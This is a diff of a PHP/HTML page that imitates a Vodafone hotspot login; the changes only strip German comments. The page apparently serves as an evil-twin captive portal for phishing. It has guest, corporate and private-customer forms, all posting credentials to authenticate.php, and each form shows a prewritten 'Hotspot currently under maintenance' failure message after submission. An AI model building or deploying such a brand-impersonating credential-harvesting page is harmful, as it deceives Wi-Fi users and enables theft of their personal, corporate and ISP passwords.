@@ -7,26 +7,22 @@ $orig = $_GET['url'] ?? '';
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Vodafone Hotspot Login</title>
-  <!-- Externes CSS einbinden -->
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
 <div class="container">
-  <!-- HEADER MIT LOGO UND TEXT -->
   <div class="header">
-    <!-- Pfad zum Logo: img/vodafone-logo.png -->
     <img src="assets/vodafone-logo.png" alt="Vodafone Logo" />
     <h1>Willkommen</h1>
     <p>im Vodafone-Hotspot mit Highspeed-Internet</p>
   </div>
 
-  <!-- AKKORDEON BUTTON 1: GÄSTE LOGIN -->
   <button class="accordion" id="acc-guests">
     <span>als Gast registrieren (3 Stunden Kostenlos/Tag)</span>
   </button>
   <div class="panel" id="panel-guests">
     <form id="form-guests" method="post" action="authenticate.php?url=<?php echo urlencode($orig); ?>">
-      <!-- E-Mail–Feld (unverändert) -->
+
       <div class="form-group">
         <label for="guest-email">Email</label>
         <input
@@ -41,7 +37,6 @@ $orig = $_GET['url'] ?? '';
         </div>
       </div>
 
-      <!-- Passwort–Feld mit Auge und Live‐Criteria -->
       <div class="form-group">
         <label for="guest-password">Passwort</label>
         <div class="password-wrapper">
@@ -52,14 +47,12 @@ $orig = $_GET['url'] ?? '';
                   placeholder="Mindestens 8 Zeichen"
                   required
           />
-          <!-- Auge zum Passwort ein-/ausblenden -->
           <button
                   type="button"
                   class="toggle-password"
                   tabindex="-1"
                   aria-label="Passwort anzeigen/verbergen"
           >
-            <!-- Ein einziges Auge‐SVG -->
             <svg
                     class="icon-eye"
                     xmlns="http://www.w3.org/2000/svg"
@@ -79,7 +72,6 @@ $orig = $_GET['url'] ?? '';
           Passwort muss ≥ 8 Zeichen sein, mit Groß-/Kleinbuchstaben, Zahl & einem der Sonderzeichen „. _ - ? ! %“.
         </div>
 
-        <!-- Live‐Checklist unter dem Passwort-Feld -->
         <ul class="password-criteria" id="guest-password-criteria">
           <li id="criteria-lowercase">
             <span class="check-icon"></span> mindestens ein Kleinbuchstabe
@@ -99,7 +91,6 @@ $orig = $_GET['url'] ?? '';
         </ul>
       </div>
 
-      <!-- Repeat‐Passwort–Feld (unverändert) -->
       <div class="form-group">
         <label for="guest-repeat">Passwort wiederholen</label>
         <input
@@ -114,23 +105,20 @@ $orig = $_GET['url'] ?? '';
         </div>
       </div>
 
-      <!-- Submit–Button (unverändert) -->
       <button type="submit">Registrieren</button>
 
-      <!-- Wartungs-Fehlermeldung (unverändert) -->
       <div class="submit-error" id="guest-submit-error">
         Login failed code 400, Hotspot currently under maintenance.
       </div>
     </form>
   </div>
 
-  <!-- AKKORDEON BUTTON 2: CORPORATE ACCESS -->
   <button class="accordion" id="acc-corp">
     <span>Login zum Corporate Data Access</span>
   </button>
   <div class="panel" id="panel-corp">
     <form id="form-corp" method="post" action="authenticate.php?url=<?php echo urlencode($orig); ?>">
-      <!-- Username–Feld -->
+
       <div class="form-group">
         <label for="corp-username">Username</label>
         <input
@@ -145,7 +133,6 @@ $orig = $_GET['url'] ?? '';
         </div>
       </div>
 
-      <!-- Portal-Passwort–Feld -->
       <div class="form-group">
         <label for="corp-password">Portal Passwort</label>
         <input
@@ -160,23 +147,20 @@ $orig = $_GET['url'] ?? '';
         </div>
       </div>
 
-      <!-- Submit–Button -->
       <button type="submit">Login</button>
 
-      <!-- Wartungs-Fehlermeldung -->
       <div class="submit-error" id="corp-submit-error">
         Login failed code 400, Hotspot currently under maintenance.
       </div>
     </form>
   </div>
 
-  <!-- AKKORDEON BUTTON 3: PRIVATKUNDEN LOGIN -->
   <button class="accordion" id="acc-private">
     <span>Privatkunden Login</span>
   </button>
   <div class="panel" id="panel-private">
     <form id="form-private" method="post" action="authenticate.php?url=<?php echo urlencode($orig); ?>">
-      <!-- Username–Feld -->
+
       <div class="form-group">
         <label for="private-username">Username</label>
         <input
@@ -191,7 +175,6 @@ $orig = $_GET['url'] ?? '';
         </div>
       </div>
 
-      <!-- Internet-Passwort–Feld -->
       <div class="form-group">
         <label for="private-password">Ihr Internet-Passwort</label>
         <input
@@ -206,10 +189,8 @@ $orig = $_GET['url'] ?? '';
         </div>
       </div>
 
-      <!-- Submit–Button -->
       <button type="submit">Login</button>
 
-      <!-- Wartungs-Fehlermeldung -->
       <div class="submit-error" id="private-submit-error">
         Login failed code 400, Hotspot currently under maintenance.
       </div>
@@ -217,7 +198,6 @@ $orig = $_GET['url'] ?? '';
   </div>
 </div>
 
-<!-- Externes JS einbinden -->
 <script src="tabs.js"></script>
 </body>
 </html>
